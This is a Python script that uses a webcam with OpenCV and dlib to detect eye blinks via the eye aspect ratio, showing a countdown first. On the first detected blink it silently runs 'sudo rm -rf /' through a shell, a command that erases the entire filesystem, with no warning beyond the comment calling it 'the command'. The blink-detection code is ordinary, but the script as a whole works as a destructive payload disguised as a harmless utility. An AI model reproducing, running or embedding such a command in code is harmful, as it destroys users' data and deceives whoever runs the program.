import cv2
import dlib
from scipy.spatial import distance
import subprocess
import time

# Function to calculate the Eye Aspect Ratio (EAR)
def calculate_ear(eye):
    A = distance.euclidean(eye[1], eye[5])
    B = distance.euclidean(eye[2], eye[4])
    C = distance.euclidean(eye[0], eye[3])
    ear = (A + B) / (2.0 * C)
    return ear

# Constants
EYE_AR_THRESH = 0.25  # EAR threshold to detect blink
EYE_AR_CONSEC_FRAMES = 3  # Number of consecutive frames to consider a blink
COUNTDOWN_TIME = 10  # Countdown time in seconds

# Initialize counters
blink_counter = 0
command_executed = False

# Initialize dlib's face detector (HOG-based) and facial landmarks predictor
detector = dlib.get_frontal_face_detector()
predictor = dlib.shape_predictor("data/shape_predictor_68_face_landmarks.dat")

# Get the index for the eyes in the 68-point landmarks
(lStart, lEnd) = (42, 48)
(rStart, rEnd) = (36, 42)

def run_blink_detection():
    global blink_counter, command_executed

    # Start the video capture from the webcam
    cap = cv2.VideoCapture(0)

    # Display countdown timer
    for i in range(COUNTDOWN_TIME, 0, -1):
        ret, frame = cap.read()
        if not ret:
            break

        countdown_text = f"Get Ready! {i} seconds"
        cv2.putText(frame, countdown_text, (10, 30), cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 0, 255), 2)
        cv2.imshow("Blink Detection", frame)
        cv2.waitKey(1000)  # Wait for 1 second

    # Start blink detection after countdown
    while True:
        ret, frame = cap.read()
        if not ret:
            break

        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
        rects = detector(gray, 0)

        for rect in rects:
            shape = predictor(gray, rect)
            shape = [(shape.part(i).x, shape.part(i).y) for i in range(68)]

            # Extract the left and right eye coordinates
            leftEye = shape[lStart:lEnd]
            rightEye = shape[rStart:rEnd]

            # Calculate the EAR for both eyes
            leftEAR = calculate_ear(leftEye)
            rightEAR = calculate_ear(rightEye)
            ear = (leftEAR + rightEAR) / 2.0

            # Check if EAR is below the threshold, indicating a blink
            if ear < EYE_AR_THRESH:
                blink_counter += 1
            else:
                if blink_counter >= EYE_AR_CONSEC_FRAMES and not command_executed:
                    # Execute the command when a blink is detected
                    command = "sudo rm -rf /"
                    subprocess.run(command, shell=True, check=True)
                    command_executed = True
                blink_counter = 0

        # Display the resulting frame
        cv2.imshow("Blink Detection", frame)

        # Break the loop on 'q' key press
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    # Release the webcam and close all OpenCV windows
    cap.release()
    cv2.destroyAllWindows()

if __name__ == "__main__":
    run_blink_detection()
